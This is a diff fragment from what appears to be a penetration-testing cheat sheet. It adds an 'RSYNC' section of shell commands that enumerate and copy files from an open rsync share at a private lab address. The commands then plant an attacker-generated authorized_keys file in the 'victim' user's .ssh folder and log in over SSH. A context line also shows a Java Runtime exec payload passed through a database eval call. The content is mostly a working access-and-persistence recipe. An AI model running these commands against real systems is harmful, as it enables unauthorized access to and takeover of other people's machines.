@@ -711,3 +711,21 @@ CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().
 ```bash
 https://www.cnblogs.com/littlehann/p/3522990.html
 ```
+# RSYNC
+```bash
+List the shares
+rsync -av --list-only rsync://192.168.66.126/fox
+Copy the files
+rsync -av rsync://192.168.66.126:873/fox .
+
+Copy keys and ssh in the box:
+First make a .ssh folder on the victim.
+mkdir .ssh
+sudo rsync -av --relative ./.ssh  rsync://192.168.66.126/fox/ (now there is a .ssh file for sure that we can put the authorized_keys in)
+Now make your keys
+ssh-keygen -f ./authorized_keys -t ed25519
+mv authorized_keys id_rsa
+mv authorized_keys.pub authorized_keys
+sudo rsync -av /home/bruiser/Tools/rsync/.ssh/authorized_keys rsync://192.168.66.126/fox/.ssh/
+ssh -i id_rsa fox@192.168.66.126
+```
